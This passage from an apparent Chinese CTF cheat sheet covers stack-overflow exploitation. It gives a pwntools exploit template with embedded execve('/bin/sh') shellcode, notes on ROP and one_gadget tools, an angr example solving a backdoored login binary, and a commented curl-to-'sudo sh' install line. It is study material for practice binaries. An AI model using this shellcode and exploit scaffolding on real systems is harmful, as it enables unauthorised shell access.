安装 pwntools。在前文的 dockerfile 中集成了 python2 和 python3 的 pwntools。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install python python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python2 -m pip install --upgrade pip==20.3.4</span><br><span class="line">python2 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p> 下面是一个比较常用的 pwntools 脚本框架。若该脚本接收了参数，则会启动远程连接，否则仅为本地测试。可以根据 <code>context.clear (arch=&#39;amd64&#39;)</code> 来指定程序是否为 64 位，根据 <code>context.update (log_level=&#39;debug&#39;)</code> 来指定是否开启 debug 模式，根据 <code>libc = ELF (&#39;./libc6_2.27-3ubuntu1.2_amd64.so&#39;)</code> 来指定需要使用的 libc 文件，此外，pg 是一个 payload 生成器，也就是 cyclic，例如 <code>pg.get (8)</code> 会得到字符串 <code>aaaaaaab</code>。debug 函数主要用来暂停程序，在本地测试的时候可以 attach 到 gdb，但是前提是需要在 tmux 里运行 exp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> abspath</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Config</span>:</span><br><span class="line">    host = <span class="string">&#x27;1.2.3.4&#x27;</span></span><br><span class="line">    port = <span class="number">1234</span></span><br><span class="line">    elf = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    libc = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># libc = &#x27;./libc.so&#x27;</span></span><br><span class="line">    <span class="comment"># Enable amd64.</span></span><br><span class="line">    x86_64 = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># To enbale debug mode, by using &quot;python exp.py d&quot;.</span></span><br><span class="line">    debug_mode = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># To enbale remote mode, by using &quot;python exp.py r&quot;.</span></span><br><span class="line">    remote_mode = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;d&#x27;</span> <span class="keyword">in</span> argv:</span><br><span class="line">            debug_mode = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;r&#x27;</span> <span class="keyword">in</span> argv:</span><br><span class="line">            remote_mode = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug_mode:</span><br><span class="line">        context.update (log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x86_64:</span><br><span class="line">        context.update (arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    context.update (terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pwn</span>:</span><br><span class="line">    proc_base = libc_base = bin_sh = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 25 bytes.</span></span><br><span class="line">    shellcode32 = <span class="string">&#x27;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">    <span class="comment"># 24 bytes.</span></span><br><span class="line">    shellcode64 = <span class="string">&#x27;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">    pg = cyclic_gen ()</span><br><span class="line">    libc = <span class="literal">None</span></span><br><span class="line">    elf = ELF (Config.elf)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> Config.libc:</span><br><span class="line">        libc = ELF (Config.libc)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> libc.search (<span class="string">&#x27;/bin/sh&#x27;</span>):</span><br><span class="line">            bin_sh = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span>, p=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="keyword">if</span> Config.debug_mode:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> Config.remote_mode:</span><br><span class="line">                gdb.attach (conn, cmd)</span><br><span class="line">        <span class="keyword">if</span> p:</span><br><span class="line">            pause ()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_conn</span>():</span><br><span class="line">        <span class="keyword">if</span> Config.remote_mode:</span><br><span class="line">            conn = remote (Config.host, Config.port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            conn = process (</span><br><span class="line">                Pwn.elf.path, env=&#123;</span><br><span class="line">                    <span class="string">&#x27;LD_PRELOAD&#x27;</span>: Pwn.libc.path <span class="keyword">if</span> Config.libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            Pwn.proc_base = conn.libs ()[abspath (Pwn.elf.path)]</span><br><span class="line">            log.info (<span class="string">&#x27;Process base address: % s&#x27;</span> % <span class="built_in">hex</span>(Pwn.proc_base))</span><br><span class="line">            <span class="keyword">if</span> Pwn.libc:</span><br><span class="line">                Pwn.libc_base = conn.libs ()[abspath (Pwn.libc.path)]</span><br><span class="line">                log.info (<span class="string">&#x27;Libc base address: % s&#x27;</span> % <span class="built_in">hex</span>(Pwn.libc_base))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> conn</span><br><span class="line"><span class="comment"># Debug funciton. Access 2 parameters, the first is gdb script and</span></span><br><span class="line"><span class="comment"># second is a bool to enable pause process after gdb attached.</span></span><br><span class="line">d = Pwn.debug</span><br><span class="line"><span class="comment"># Get a pwn connection, including local and remote.</span></span><br><span class="line">get_conn = Pwn.get_conn</span><br><span class="line"></span><br><span class="line"><span class="comment"># The pwn connection.</span></span><br><span class="line">conn = get_conn ()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload generator, generate string like &quot;aaaabaaacaaa&quot;...</span></span><br><span class="line">pg = Pwn.pg</span><br><span class="line"><span class="comment"># The ELF file.</span></span><br><span class="line">elf = Pwn.elf</span><br><span class="line"><span class="comment"># The libc file.</span></span><br><span class="line">libc = Pwn.libc</span><br><span class="line"><span class="comment"># Process base address. It is very usable if enable PIE.</span></span><br><span class="line">proc_base = Pwn.proc_base</span><br><span class="line"><span class="comment"># Libc base address. Only availbale with local libc, for checking leaked libc address.</span></span><br><span class="line">libc_base = Pwn.libc_base</span><br><span class="line"><span class="comment"># The &quot;/bin/sh&quot; offset address in libc.</span></span><br><span class="line">bin_sh = Pwn.bin_sh</span><br><span class="line"><span class="comment"># A standard 25 bytes x86 shellcode.</span></span><br><span class="line">shellcode32 = Pwn.shellcode32</span><br><span class="line"><span class="comment"># Astandard 24 bytes x86-64 shellcode.</span></span><br><span class="line">shellcode64 = Pwn.shellcode64</span><br><span class="line"><span class="comment"># -------------------------=[Write your pwn code here]=-------------------------</span></span><br><span class="line">conn.interactive ()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 一些常用的 pwntools 功能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pause ()  <span class="comment"># 暂停程序执行，在 send 数据之前暂停才有效，通常用来暂停程序执行等到用 gdb 进行 attach</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send and recv.</span></span><br><span class="line">conn.sendline (<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">line = conn.recvline ()</span><br><span class="line">conn.sendlineafter (<span class="string">&#x27;Name : &#x27;</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">data = conn.recvall ()</span><br><span class="line">data = conn.recv (<span class="number">10</span>)  <span class="comment"># recv 10 bytes data.</span></span><br><span class="line">conn.recvuntil (<span class="string">&#x27;Name : &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Auto create a new window and attach to gdb</span></span><br><span class="line">gdb.attach (conn)</span><br><span class="line"></span><br><span class="line">payload = p64 (<span class="number">0x800000</span>)  <span class="comment"># 64-bits int to string, return 8 bytes string.</span></span><br><span class="line">payload = p32 (<span class="number">0x800000</span>)  <span class="comment"># 32-bits int to string, return 4 bytes string.</span></span><br><span class="line">data = u64 (<span class="string">&#x27;\x00\x00\xff\xff&#x27;</span>)  <span class="comment"># 64-bits string to int.</span></span><br><span class="line">data = u32 (<span class="string">&#x27;\x00\x00\xff\xff&#x27;</span>)  <span class="comment"># 32-bits string to int.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write asm.</span></span><br><span class="line">shellcode = asm (<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov eax,1;</span></span><br><span class="line"><span class="string">push eax;</span></span><br><span class="line"><span class="string">pop eax;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">conn.send (shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get libc offset.</span></span><br><span class="line">puts_offset = libc.symbols [<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols [<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># Get address of the string /bin/sh&quot; from libc.</span></span><br><span class="line">str_bin_sh = libc.search (<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get plt or got address of a function.</span></span><br><span class="line">puts_plt = elf.plt [<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got [<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p> 用来对一个二进制程序进行安全检查，检查是否开启常用的安全措施，实际上该程序是一个属于 pwntools 的 python 脚本。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/9.png"></p><h2 id="asm-online"><a href="#asm-online" class="headerlink" title="asm online"></a>asm online</h2><p> 一个可以在线编写汇编并且编译为 hex 字符串的 <a href="https://defuse.ca/online-x86-assembler.htm#disassembly"> 网站 </a>，支持 x86 与 x64，很方便编写和检查 shellcode，不过 pwntools 中集成了便携 asm 的 api。</p><h2 id="libc-database"><a href="#libc-database" class="headerlink" title="libc-database"></a>libc-database</h2><p> 一个可以根据程序泄漏出的 libc 函数地址与函数名查询 libc 版本的 <a href="https://libc.rip/"> 在线网站 </a>。同时，<a href="https://github.com/niklasb/libc-database">libc-database</a> 还是一个离线数据库，包含了几乎所有的 libc 版本，并且提供了方便的查询接口，但是该离线数据库非常大。以及 <a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a> 也是一个具有同样功能的离线数据库。</p><p> 安装 libc-database，用 get 就可以自动下载所有的 ubuntu 的 libc 数据库到 db 目录下，通过 find 就可以直接根据函数名和后三个 16 进制的偏移识别对应的 libc。前文中的 dockerfile 集成了 libc-database，但是没有下载任何数据库，下载的 libc 数据库通常会达到好几个 g。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/niklasb/libc-database</span><br><span class="line"><span class="built_in">cd</span> libc-database</span><br><span class="line">./get</span><br><span class="line">./find <span class="built_in">printf</span> 260 puts f30</span><br></pre></td></tr></table></figure><h2 id="ROPgadgets"><a href="#ROPgadgets" class="headerlink" title="ROPgadgets"></a>ROPgadgets</h2><p> 检查一个 elf 文件中的所有 gadgets，包括 rop，jop 以及 cop 的 gadgets。安装 ropgadgets，在前文的 dockerfile 中集成了 ropgadgets。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install capstone</span><br><span class="line">pip install ropgadget</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">usage: ROPgadget.py [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                    [--string &lt;string&gt;] [--memstr &lt;string&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                    [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                    [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                    [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                    [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                    [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]</span><br><span class="line">                    [--dump] [--silent] [--align ALIGN]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">    -h, --help           show this help message and exit</span><br><span class="line">    -v, --version        Display the ROPgadget&#x27;s version</span><br><span class="line">    -c, --checkUpdate    Checks if a new version is available</span><br><span class="line">    --binary &lt;binary&gt;    Specify a binary filename to analyze</span><br><span class="line">    --opcode &lt;opcodes&gt;   Search opcode in executable segment</span><br><span class="line">    --string &lt;string&gt;    Search string in readable segment</span><br><span class="line">    --memstr &lt;string&gt;    Search each byte in all readable segment</span><br><span class="line">    --depth &lt;nbyte&gt;      Depth for search engine (default 10)</span><br><span class="line">    --only &lt;key&gt;         Only show specific instructions</span><br><span class="line">    --filter &lt;key&gt;       Suppress specific mnemonics</span><br><span class="line">    --range &lt;start-end&gt;  Search between two addresses (0x...-0x...)</span><br><span class="line">    --badbytes &lt;byte&gt;    Rejects specific bytes in the gadget&#x27;s address</span><br><span class="line">    --rawArch &lt;arch&gt;     Specify an arch for a raw file</span><br><span class="line">    --rawMode &lt;mode&gt;     Specify a mode for a raw file</span><br><span class="line">    --rawEndian &lt;endian&gt; Specify an endianness for a raw file</span><br><span class="line">    --re &lt;re&gt;            Regular expression</span><br><span class="line">    --offset &lt;hexaddr&gt;   Specify an offset for gadget addresses</span><br><span class="line">    --ropchain           Enable the ROP chain generation</span><br><span class="line">    --thumb              Use the thumb mode for the search engine (ARM only)</span><br><span class="line">    --console            Use an interactive console for search engine</span><br><span class="line">    --norop              Disable ROP search engine</span><br><span class="line">    --nojop              Disable JOP search engine</span><br><span class="line">    --callPreceded       Only show gadgets which are call-preceded</span><br><span class="line">    --nosys              Disable SYS search engine</span><br><span class="line">    --multibr            Enable multiple branch gadgets</span><br><span class="line">    --all                Disables the removal of duplicate gadgets</span><br><span class="line">    --noinstr            Disable the gadget instructions console printing</span><br><span class="line">    --dump               Outputs the gadget bytes</span><br><span class="line">    --silent             Disables printing of gadgets during analysis</span><br><span class="line">    --align ALIGN        Align gadgets addresses (in bytes)</span><br><span class="line">    --mipsrop &lt;rtype&gt;    MIPS useful gadgets finder</span><br><span class="line">                         stackfinder|system|tails|lia0|registers</span><br></pre></td></tr></table></figure><p> 如下图所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/11.png"></p><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p> 检查一个 libc 中是否有 one gadget。所谓 one gadget 指的是通过一个 gadget，满足某种约束（例如寄存器中某个值）即可直接 getshell。安装 one_gadget 如下。前文中的 dockerfile 集成了 one_gadget。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><p> 如下图所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/12.png"></p><p> 以上图第 2 个 one gadget 为例，若可以满足 rsp+0x40 为 0，则直接跳转到 libc 中的 0x4f3c2 偏移就可以调用 execve 来 get shell。需要注意的是使用 one gadget 必须要先知道 libc 的基址。</p><h2 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h2><p> 类似 ropgadget 的工具，但是输出更好看一点，找到的 gadgets 貌似也更多一点，安装如下。前文中的 dockerfile 集成了 ropper。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ropper</span><br></pre></td></tr></table></figure><p> 如下图所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/13.png"></p><h2 id="Angr"><a href="#Angr" class="headerlink" title="Angr"></a>Angr</h2><p>angr 是一个 python 库，主要用来求解多种约束下的某一条程序路径所对应的输入。angr 的安装如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential virtualenvwrapper</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 不过 angr 非常大，所以一般推荐使用 angr 的 docker。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install docker</span></span><br><span class="line"><span class="comment"># curl -sSL https://get.docker.com/ | sudo sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pull the docker image</span></span><br><span class="line">sudo docker pull angr/angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># run it</span></span><br><span class="line">sudo docker run -it angr</span><br></pre></td></tr></table></figure><p>angr 主要是为了逆向而生，比如某程序有如下约束条件才可以继续执行。该程序来自 angr 官方示例。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *sneaky = <span class="string">&quot;SOSNEAKY&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">authenticate</span><span class="params">(<span class="type">char</span> *username, <span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> stored_pw [<span class="number">9</span>];</span><br><span class="line">    stored_pw [<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> pwfile;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//evil back d00r</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, sneaky) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    pwfile = open (username, O_RDONLY);</span><br><span class="line">    read (pwfile, stored_pw, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, stored_pw) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">accepted</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the admin console, trusted user!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">rejected</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Go away!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> username [<span class="number">9</span>];</span><br><span class="line">    <span class="type">char</span> password [<span class="number">9</span>];</span><br><span class="line">    <span class="type">int</span> authed;</span><br><span class="line"></span><br><span class="line">    username [<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    password [<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Username: \n&quot;</span>);</span><br><span class="line">    read (<span class="number">0</span>, username, <span class="number">8</span>);</span><br><span class="line">    read (<span class="number">0</span>, &amp;authed, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password: \n&quot;</span>);</span><br><span class="line">    read (<span class="number">0</span>, password, <span class="number">8</span>);</span><br><span class="line">    read (<span class="number">0</span>, &amp;authed, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    authed = authenticate (username, password);</span><br><span class="line">    <span class="keyword">if</span> (authed) accepted ();</span><br><span class="line">    <span class="keyword">else</span> rejected ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 该程序要求我们输入一个正确的用户名和密码，通过手工逆向是可以很容易找到的，但是利用 angr 的脚本如下，其中 fauxware 是程序名，最后打印出了所有可能的通过检查的路径分支所对应的输入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">basic_symbolic_execution</span>():</span><br><span class="line">    p = angr.Project (<span class="string">&#x27;fauxware&#x27;</span>)</span><br><span class="line">    state = p.factory.entry_state ()</span><br><span class="line"></span><br><span class="line">    path = p.factory.path (state)</span><br><span class="line"></span><br><span class="line">    pathgroup = p.factory.path_group (path)</span><br><span class="line">    pathgroup.step (until=<span class="keyword">lambda</span> lpg: <span class="built_in">len</span>(lpg.active) &gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pathgroup.active)):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;possible % d: &quot;</span> % i, pathgroup.active [i].state.posix.dumps (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span 